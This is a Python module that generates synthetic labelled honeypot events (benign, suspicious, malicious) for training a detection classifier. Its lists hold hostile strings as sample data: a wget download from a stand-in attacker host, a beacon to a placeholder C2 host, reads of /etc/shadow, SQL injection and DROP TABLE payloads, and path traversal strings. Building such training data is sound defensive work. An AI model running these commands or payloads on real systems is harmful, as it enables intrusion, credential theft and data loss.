"""Synthetic labelled training data: benign / suspicious / malicious."""

import random
import string
from datetime import datetime, timezone

BENIGN_PATHS = ["/", "/index.html", "/health", "/favicon.ico"]
BENIGN_UAS = ["kube-probe/1.25", "UptimeRobot/2.0", "Mozilla/5.0 Chrome/120.0"]
SUS_PATHS = ["/wp-admin", "/phpmyadmin", "/.git/config", "/xmlrpc.php",
             "/admin", "/login", "/manager/html"]
SUS_USERS = ["root", "admin", "administrator", "test", "guest",
             "ubuntu", "pi", "user", "ftp", "anonymous"]
WEAK_PWDS = ["123456", "password", "admin123", "toor", "raspberry", "1234"]

MAL_USERS = ["svc_backup", "db_admin", "deploy", "jenkins", "ansible"]
MAL_CMDS = ["wget http://evil.example/x.sh -O /tmp/x",
            "cat /etc/shadow", "chmod 777 /tmp/x", "crontab -e",
            "ifconfig", "history", "curl http://c2.example/beacon"]
MAL_SQLI = ["1' OR '1'='1", "admin'--",
            "1 UNION SELECT username,password FROM users--",
            "'; DROP TABLE users;--"]
MAL_TRAV = ["../../../../etc/passwd", "..\\..\\windows\\win.ini", "/etc/shadow"]

BENIGN_IPS = ["192.168.1.50", "10.0.0.99", "172.16.0.9"]
ATTACK_IPS = ["45.61.187.24", "91.240.118.6", "185.220.101.5",
              "103.75.190.11", "159.223.44.9"]


def _ts(hour=None):
    now = datetime.now(timezone.utc)
    h = hour if hour is not None else now.hour
    return now.replace(hour=h, minute=random.randint(0, 59),
                       second=random.randint(0, 59), microsecond=0) \
        .isoformat().replace("+00:00", "Z")


def _event(decoy, etype, data=None, raw="", hour=None, attacker=False):
    return {"timestamp": _ts(hour),
            "source_ip": random.choice(ATTACK_IPS if attacker else BENIGN_IPS),
            "source_port": random.randint(40000, 60000),
            "decoy": decoy, "event_type": etype,
            "data": data or {}, "raw": raw}


def _strong_pwd():
    return "".join(random.choices(string.ascii_letters + string.digits, k=14))


def _benign():
    kind = random.random()
    hour = random.randint(8, 18)
    if kind < 0.5:
        return _event(random.choice(["ssh", "http", "ftp", "telnet", "mysql"]),
                      "connection", {"note": "internal health check"},
                      hour=hour)
    path = random.choice(BENIGN_PATHS)
    return _event("http", "http_request",
                  {"path": path, "user_agent": random.choice(BENIGN_UAS)},
                  raw=f"GET {path}", hour=hour)


def _suspicious():
    hour = random.randint(0, 23)
    if random.random() < 0.55:
        u = random.choice(SUS_USERS)
        return _event(random.choice(["ssh", "telnet", "ftp"]), "auth_attempt",
                      {"username": u, "password": random.choice(WEAK_PWDS)},
                      raw=f"login {u}", hour=hour, attacker=True)
    path = random.choice(SUS_PATHS)
    return _event("http", "http_request", {"path": path},
                  raw=f"GET {path}", hour=hour, attacker=True)


def _malicious():
    hour = random.choice([0, 1, 2, 3, 4, 5, 22, 23])
    kind = random.random()
    if kind < 0.25:
        payload = random.choice(MAL_SQLI)
        return _event("http", "http_request", {"path": f"/admin?id={payload}"},
                      raw=f"GET /admin?id={payload}", hour=hour, attacker=True)
    if kind < 0.45:
        payload = random.choice(MAL_TRAV)
        return _event("http", "http_request", {"path": payload},
                      raw=f"GET {payload}", hour=hour, attacker=True)
    if kind < 0.65:
        u, p = random.choice(MAL_USERS), _strong_pwd()
        return _event(random.choice(["ssh", "telnet"]), "auth_attempt",
                      {"username": u, "password": p},
                      raw=f"login {u}", hour=hour, attacker=True)
    if kind < 0.85:
        cmd = random.choice(MAL_CMDS)
        return _event("ssh", "command", {"command": cmd}, raw=cmd,
                      hour=hour, attacker=True)
    u, p = random.choice(MAL_USERS), _strong_pwd()
    return _event("http", "http_login", {"username": u, "password": p},
                  raw=f"POST /admin {u}", hour=hour, attacker=True)


def generate_dataset(n_samples=6000, seed=42):
    random.seed(seed)
    n_benign = int(n_samples * 0.40)
    n_suspicious = int(n_samples * 0.35)
    n_malicious = n_samples - n_benign - n_suspicious

    pairs = [(_benign(), "benign") for _ in range(n_benign)]
    pairs += [(_suspicious(), "suspicious") for _ in range(n_suspicious)]
    pairs += [(_malicious(), "malicious") for _ in range(n_malicious)]
    random.shuffle(pairs)

    events = [p[0] for p in pairs]
    labels = [p[1] for p in pairs]
    return events, labels
